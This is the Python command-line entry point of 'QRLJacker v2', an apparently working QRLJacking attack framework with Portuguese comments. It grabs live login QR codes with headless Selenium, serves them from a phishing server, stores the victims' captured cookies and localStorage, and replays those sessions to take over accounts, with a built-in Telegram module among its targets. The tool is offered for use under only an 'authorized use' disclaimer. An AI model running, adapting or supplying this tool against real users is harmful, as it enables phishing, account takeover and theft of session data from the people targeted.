#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""QRLJacker v2 — QRLJacking Exploitation Framework (rewritten).

Reescrita moderna do QRLJacker original (OWASP/QRLJacking):
  * Selenium 4 com Selenium Manager (sem geckodriver manual)
  * Chrome e Firefox, seletores CSS + heurística de QR
  * Servidor de phishing com QR em tempo real
  * Sessões salvas (cookies + localStorage) e replay em um clique

Uso autorizado apenas — consulte o README.
"""
import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from core import settings
from core.color import status, error, warning, info, title
from core.grabber import Grabber
from core.session_store import replay
from modules import MODULES_LIST, load_builtin, from_json

BANNER = r"""
  ___   __ ___   _____    ____   __ ___   _____
 |__ \ /_ |__ \ / ___/   / __ \ / _/_\ \ / ___/
    ) | | |  ) |\___ \  | |  | |/ (_)) |\___ \
   / /  | | / /  ___) | | |  | / (_// /  ___) |
  /_/   |_|/_/  |____/  | |__| \___/_/  |____/
                          \___\_\

      QRLJacking Exploitation Framework v2
""".replace("v2 —", "v2.0 —")


def banner():
    title(BANNER)
    info(f"QRLJacker v{settings.VERSION} | Selenium 4 | Uso exclusivo em testes autorizados")
    print()


def print_modules():
    print(f"  {'#':<3}{'Módulo':<12}{'Alvo':<40}")
    print("  " + "-" * 55)
    for i, name in enumerate(MODULES_LIST, 1):
        m = load_builtin(name)
        print(f"  {i:<3}{m.name:<12}{m.url:<40}")
    print("  " + "-" * 55)
    print("  * Módulos personalizados: use --module-file arquivo.json")


def resolve_module(args):
    if args.module_file:
        return from_json(args.module_file)
    if args.module:
        return load_builtin(args.module)
    return None


def do_check():
    """Diagnóstico do ambiente (navegadores, drivers, módulos)."""
    banner()
    info(f"Python: {sys.version.split()[0]}")
    try:
        import selenium
        info(f"Selenium: {selenium.__version__}")
    except Exception as e:
        error(f"Selenium não importável: {e}")
        return 1

    from core.browser import make_driver
    for b in ("chrome", "firefox"):
        try:
            drv, _ = make_driver(b, headless=True, useragent="(default)")
            drv.get("about:blank")
            drv.quit()
            status(f"Navegador {b}: OK (driver resolvido pelo Selenium Manager)")
        except Exception as e:
            error(f"Navegador {b}: FALHOU ({str(e).splitlines()[0]})")
    settings.ensure_dirs()
    status(f"Diretórios ok: {settings.SESSIONS_DIR.parent}")
    print_modules()
    return 0


def do_list():
    banner()
    print_modules()
    return 0


def do_sessions():
    settings.ensure_dirs()
    sessions = settings.load_sessions()
    if not sessions:
        info("Nenhuma sessão capturada ainda.")
        return 0
    print(f"  {'ID':<4}{'Módulo':<12}{'Capturada em':<22}URL")
    print("  " + "-" * 70)
    for sid, e in sorted(sessions.items(), key=lambda kv: int(kv[0])):
        print(f"  {sid:<4}{e['name']:<12}{e.get('saved_at', '?'):<22}{e['web_url']}")
    return 0


def do_replay(args):
    settings.ensure_dirs()
    try:
        drv = replay(args.replay, browser=args.browser, headless=False)
    except KeyError as e:
        error(str(e))
        return 1
    if drv is None:
        return 1
    info("Navegador aberto com a sessão. Feche a janela para encerrar.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            drv.quit()
        except Exception:
            pass
    return 0


def do_run(args):
    settings.ensure_dirs()
    try:
        module = resolve_module(args)
    except (KeyError, ValueError) as e:
        error(f"Módulo inválido: {e}")
        return 1
    if module is None:
        error("Nenhum módulo informado. Use --module <nome> ou --module-file <arquivo.json>")
        return 1

    grabber = Grabber(
        module,
        host=args.host,
        port=args.port,
        headless=not args.visible,
        browser=args.browser,
        useragent=args.useragent,
        once=args.once,
        once_timeout=args.once_timeout,
    )
    try:
        ok = grabber.run(with_server=not args.once)
    except RuntimeError as e:
        error(str(e))
        return 1
    if args.once:
        shot = grabber.qr_png
        if shot.exists():
            status(f"QR salvo em {shot}")
            return 0
        return 1
    info("Sessão capturada!" if ok else "Encerrado sem captura.")
    return 0 if ok else 1


def interactive():
    banner()
    settings.ensure_dirs()
    print_modules()
    try:
        choice = input("\n[?] Número do módulo: ").strip()
        name = MODULES_LIST[int(choice) - 1]
        module = load_builtin(name)
        host = input("[?] Host do servidor [0.0.0.0]: ").strip() or "0.0.0.0"
        port = int(input("[?] Porta [8080]: ").strip() or "8080")
        vis = input("[?] Navegador visível em vez de headless? [s/N]: ").strip().lower().startswith("s")
        print()
        grabber = Grabber(module, host=host, port=port, headless=not vis)
        ok = grabber.run(with_server=True)
        info("Sessão capturada!" if ok else "Encerrado sem captura.")
        if settings.load_sessions():
            sid = input("[?] Replay de sessão (nº, vazio para sair): ").strip()
            if sid:
                drv = replay(sid)
                info("Feche a janela do navegador para encerrar.")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    pass
                finally:
                    try:
                        drv.quit()
                    except Exception:
                        pass
    except (ValueError, IndexError):
        error("Opção inválida.")
    except (EOFError, KeyboardInterrupt):
        print()
    return 0


def build_parser():
    p = argparse.ArgumentParser(
        prog="QrlJacker.py",
        description="QRLJacking Exploitation Framework v2 (reescrita moderna)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=("exemplos:\n"
                "  python QrlJacker.py\n"
                "  python QrlJacker.py --check\n"
                "  python QrlJacker.py -m telegram --port 8080 --visible\n"
                "  python QrlJacker.py -m telegram --once        (teste rápido do QR)\n"
                "  python QrlJacker.py --module-file alvo.json\n"
                "  python QrlJacker.py --sessions\n"
                "  python QrlJacker.py --replay 0\n"))
    p.add_argument("--list", action="store_true", help="lista os módulos disponíveis")
    p.add_argument("-m", "--module", choices=MODULES_LIST, help="módulo builtin para executar")
    p.add_argument("--module-file", help="módulo personalizado em JSON")
    p.add_argument("--host", default=settings.HOST, help=f"host do servidor de phishing (padrão: {settings.HOST})")
    p.add_argument("--port", type=int, default=settings.PORT, help=f"porta do servidor (padrão: {settings.PORT})")
    p.add_argument("--browser", choices=["auto", "chrome", "firefox"], default="auto",
                   help="navegador do grabber (padrão: auto)")
    p.add_argument("--visible", action="store_true", help="executa o navegador visível (padrão: headless)")
    p.add_argument("--useragent", default="(random)", help="User-Agent fixo, ou (random)/(default)")
    p.add_argument("--once", action="store_true", help="captura um único QR e sai (teste, sem servidor)")
    p.add_argument("--once-timeout", type=int, default=settings.ONCE_TIMEOUT,
                   metavar="SEG", help=f"limite do modo --once em segundos (padrão: {settings.ONCE_TIMEOUT})")
    p.add_argument("--sessions", action="store_true", help="lista as sessões capturadas")
    p.add_argument("--replay", metavar="ID", help="abre um navegador com a sessão capturada")
    p.add_argument("--check", action="store_true", help="diagnóstico do ambiente")
    p.add_argument("--debug", action="store_true", help="saída de depuração verbosa")
    p.add_argument("--verbose", action="store_true", help="mensagens extras")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.debug:
        settings.DEBUG = True
    if args.verbose:
        settings.VERBOSE = True

    if args.check:
        return do_check()
    if args.list:
        return do_list()
    if args.sessions:
        return do_sessions()
    if args.replay is not None:
        return do_replay(args)
    if args.module or args.module_file:
        return do_run(args)
    if not sys.stdin.isatty():
        error("Modo interativo exige um terminal. Use as flags (--help).")
        return 1
    return interactive()


if __name__ == "__main__":
    sys.exit(main())
